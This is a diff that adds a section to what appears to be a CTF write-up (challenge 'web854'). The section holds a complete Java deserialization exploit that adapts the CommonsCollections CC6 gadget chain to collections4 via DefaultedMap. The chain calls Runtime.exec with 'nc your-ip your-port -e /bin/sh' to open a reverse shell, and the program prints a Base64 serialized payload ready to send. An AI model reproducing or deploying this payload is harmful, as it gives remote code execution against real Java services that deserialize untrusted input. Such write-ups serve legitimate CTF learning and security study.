@@ -256,4 +256,76 @@ public class web854 {
 ```
 
 
+^
+CC6链改成适用CommonsCollections=4。借助类DefaultedMap。
+
+
+```
+package show.ctf.java;
+
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.DefaultedMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class web854 {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc your-ip your-port -e /bin/sh"})
+//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
+
+        DefaultedMap defaultedMap = new DefaultedMap(chainedTransformer);
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap,"evo1");
+
+        HashMap<Object,Object> map = new HashMap<>();
+        map.put(tiedMapEntry,"evo2");
+
+
+        Class c = ChainedTransformer.class;
+        Field iTransformers = c.getDeclaredField("iTransformers");
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,transformers);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(map);
+
+        byte[] payloadBytes = byteArrayOutputStream.toByteArray();
+        String payload = Base64.getEncoder().encodeToString(payloadBytes);
+        System.out.println(payload);
+
+//        serialize(map);
+//        unserialize("ser.bin");
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+    }
+
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
+```
+
 
